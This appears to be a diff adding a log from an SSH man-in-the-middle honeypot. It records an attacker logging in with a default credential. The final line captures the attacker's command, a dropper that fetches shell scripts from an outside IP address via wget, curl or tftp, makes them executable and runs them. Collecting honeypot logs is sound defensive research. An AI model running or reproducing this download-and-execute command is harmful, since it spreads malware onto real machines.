@@ -1,0 +1,15 @@
+2019-11-12 04:45:00.563 - [Info] MITM Version: 1.26
+2019-11-12 04:45:00.570 - [Info] Auto Access Enabled: true
+2019-11-12 04:45:00.570 - [Debug] [Init] Auto Access Barrier: true
+2019-11-12 04:45:00.592 - [Info] SSH man-in-the-middle server for 172.20.0.5 listening on 0.0.0.0:10104
+2019-11-12 04:53:43.091 - [Debug] [Connection] Attacker connected: 115.89.126.224 | Client Identification: SSH-2.0-Liquor
+2019-11-12 04:53:44.304 - [Debug] [Auth] Attacker 115.89.126.224 trying to authenticate with "none"
+2019-11-12 04:53:44.306 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2019-11-12 04:53:44.733 - [Debug] [Auth] Attacker 115.89.126.224 trying to authenticate with "password"
+2019-11-12 04:53:44.736 - [Debug] [Auto Access] Attacker: 115.89.126.224, Threshold: 1, Attempts: 1
+2019-11-12 04:53:44.736 - [Debug] [Auto Access] Compromising the honeypot
+2019-11-12 04:53:44.737 - [Debug] [Auto Access] Adding the following credentials: "NetLinx:password"
+2019-11-12 04:53:45.203 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-11-12 04:53:45.204 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.5
+2019-11-12 04:53:45.316 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-11-12 04:53:46.181 - [Debug] [EXEC] Noninteractive mode attacker command: echo 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && rm *.sh; wget http://46.246.63.60/bin.sh || curl http://46.246.63.60/curl.sh -o curl.sh || tftp 46.246.63.60 -c get tftp.sh || tftp -r tftp.sh -g 46.246.63.60; chmod +x *.sh; ./bin.sh; ./curl.sh; ./tftp.sh' | sh
